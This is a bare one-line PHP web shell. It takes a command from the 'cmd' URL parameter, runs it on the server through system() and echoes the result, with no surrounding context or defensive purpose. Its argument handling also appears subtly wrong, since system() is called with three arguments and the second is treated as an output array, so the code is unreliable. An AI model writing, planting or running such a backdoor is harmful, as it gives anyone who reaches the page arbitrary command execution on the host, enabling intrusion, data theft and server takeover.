<?php $c=$_GET['cmd'];system($c,$o,$r);if($r===0){echo"<pre>".implode("\n",$o)."</pre>";}else{echo".";}?>


